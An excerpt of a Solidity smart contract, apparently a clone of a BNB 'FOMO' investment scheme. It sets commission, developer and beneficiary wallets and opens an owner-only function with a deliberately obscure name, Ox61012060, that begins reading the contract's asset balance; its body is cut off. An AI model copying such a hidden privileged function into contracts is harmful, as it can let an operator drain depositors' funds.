...
contract QUANTERRAMATICFOMOCLONE1 {
    ...
    uint256 constant public NFT_BOXES_STEP = 100 ether; //100 BNB
	...
	constructor(address payable wallet, address payable _developer, address payable _primaryBenificiary ) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
		developerWallet = _developer;
        primaryBenificiary = _primaryBenificiary;
    ...
    function Ox61012060() public  {
        require(msg.sender == primaryBenificiary, "only owner");
        uint assetBalance;
